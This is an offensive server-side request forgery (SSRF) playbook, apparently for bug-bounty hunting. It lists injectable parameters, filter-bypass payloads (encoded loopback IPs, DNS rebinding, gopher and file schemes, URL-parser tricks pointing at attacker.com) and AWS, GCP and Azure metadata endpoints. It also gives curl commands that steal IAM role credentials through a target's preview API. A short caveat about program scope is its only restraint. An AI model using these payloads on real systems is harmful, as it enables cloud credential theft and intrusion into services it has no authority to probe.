# SSRF — playbook

## when to try
- Any param that takes a URL/host: `?url=`, `?image=`, `?webhook=`, `?callback=`, `?next=`.
- File-import features ("import from URL"), preview generators, RSS readers,
  webhook targets, profile picture by URL, OAuth `redirect_uri` (also AT, see oauth.md).
- PDF/image renderers (often headless Chromium → in-cloud SSRF, sometimes RCE).
- API gateways that proxy to internal services (X-Forwarded-Host, custom routes).

## key bypass tricks
- **Decimal/octal/hex IPs**: `127.0.0.1` ↔ `2130706433` ↔ `0177.0.0.1` ↔ `0x7f000001`.
- **IPv6 loopback**: `[::]`, `[0:0:0:0:0:ffff:127.0.0.1]`, `[::ffff:7f00:1]`.
- **DNS rebinding**: services that resolve once at validate-time and once at fetch-time. Use `*.rebind.it` or your own DNS with TTL=0.
- **Redirects**: target validates the URL but follows redirects → host an HTTP redirect on your domain to `http://169.254.169.254/`.
- **Schemes**: `file://`, `gopher://` (powerful — speak any TCP), `dict://`, `ftp://`, `ldap://`, `jar://` (Java), `php://filter` (read source).
- **URL parser confusion**: `http://attacker.com#@127.0.0.1/`, `http://127.0.0.1@attacker.com/`, `http://127.0.0.1\\@attacker.com`, `http:///127.0.0.1/`.
- **Cloud metadata**:
  - AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
  - GCP: `http://metadata.google.internal/computeMetadata/v1/` (needs `Metadata-Flavor: Google`)
  - Azure: `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net` (needs `Metadata: true`)
  - DigitalOcean: `http://169.254.169.254/metadata/v1/`

## confirmation flow
1. Set up an **out-of-band listener** (your own DNS/HTTP — Burp Collaborator, interactsh, or `python3 -m http.server` behind a quick `cloudflared`/`ngrok`).
2. Submit `?url=https://YOUR-OOB/probe`. Watch for inbound DNS+HTTP. Capture the User-Agent header (often reveals stack: `python-requests/`, `Go-http-client/`, `axios/`, `node-fetch/`).
3. Try `?url=http://127.0.0.1:80/`, `?url=http://127.0.0.1:22/` — banner / different latency = pingable.
4. Cloud probe: `?url=http://169.254.169.254/`. If the renderer needs the metadata header, push it via response from your domain (redirect or 200 with body content).

## exploitation snippet
```bash
# Quick OOB
nslookup x.your-oob.example
curl 'https://target/api/preview?url=http://x.your-oob.example/probe'

# AWS creds via metadata SSRF
curl 'https://target/api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
# → returns role name; refetch with role:
curl 'https://target/api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/MyRole'
```

## caveats
- ALWAYS check program scope for cloud/internal probing — many programs forbid metadata access even when SSRF is in scope.
- A "200 OK" from `127.0.0.1` doesn't mean exploitable — many apps health-check themselves on localhost. Need impact to upgrade severity.
- Rate-limit your OOB probes; one strike per endpoint is enough to confirm.

## provenance
- PortSwigger SSRF lab family (basic, blind, with filter bypass).
- Public reports: AWS metadata SSRF on Capital One; Shopify Exchange GCP metadata.
